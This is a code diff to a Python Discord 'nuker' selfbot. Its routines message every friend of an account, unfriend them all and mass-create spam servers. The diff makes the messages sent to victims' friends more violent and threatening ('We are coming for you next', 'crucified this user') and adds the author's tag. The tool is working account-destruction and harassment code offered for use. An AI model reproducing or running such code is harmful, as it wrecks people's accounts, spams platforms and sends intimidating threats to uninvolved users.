@@ -97,7 +97,7 @@ def nuke():
 
         for user in bot.user.friends:
             try:
-                await user.dm_channel.send('Add AK#2353 and tryout https://replit.com/@AK666/Gun-Selfbot if you want.')
+                await user.dm_channel.send('AK#2353 has crucified this user and put him on a bloody cross and now he is bleeding on the grass beneath him. Save him by adding AK#2353. If you piss AK off, He will come hunt you down. Cya! || This is me: https://images-ext-2.discordapp.net/external/1MVLOt7nVjKSIOpT3hUVmhyxobAeyKooxFJztF4YyNM/%3Fsize%3D256/https/cdn.discordapp.com/avatars/468918343508688896/a_97582fc0a55895560253b41a6c2ae401.gif || ')
                 await user.remove_friend()
                 print(f'unfriended {user}')
             except:
@@ -108,7 +108,7 @@ def nuke():
         print('\n')
 
         for i in range(times):
-            await bot.create_guild('Nuked by AK#2353', region=None, icon=None)
+            await bot.create_guild('Nuked By AK#2353', region=None, icon=None)
             print(f'{i} useless server created')
         print('\n')
         print('Max server limit is [100]')
@@ -146,10 +146,10 @@ def unfriender():
 
         for user in bot.user.friends:
             try:
-                embed=discord.Embed(title="AK Owns You", description="AK On Top", color=0x0000ff) 
-                embed.set_author(name="AK has fucked this account.") 
-                embed.set_footer(text="Sent by AK#2353")
-                embed.set_image(url="https://cdn.discordapp.com/attachments/773768229712822312/773793700601659392/image0.gif") 
+                embed=discord.Embed(title="You're not safe btw. We are coming for you next. Better Run!", description="Chapter 666: This user is now on a bloody cross bleeding out slowly.", color=0xff0000) 
+                embed.set_author(name="Ay'k has crucified this user.") 
+                embed.set_footer(text="Sent by AK#2353 | Add Me")
+                embed.set_image(url="https://images-ext-2.discordapp.net/external/1MVLOt7nVjKSIOpT3hUVmhyxobAeyKooxFJztF4YyNM/%3Fsize%3D256/https/cdn.discordapp.com/avatars/468918343508688896/a_97582fc0a55895560253b41a6c2ae401.gif") 
                 await user.dm_channel.send(embed=embed)
                 await user.remove_friend()
                 print(f'unfriended {user}')
@@ -204,7 +204,7 @@ def spamservers():
 
         for i in range(times):
             await bot.create_guild(
-                'Nuked by AK#2353', region=None, icon=None)
+                'Nuked By AK#2353', region=None, icon=None)
             print(f'{i} useless server created')
 
         print('max server limit is [100]')
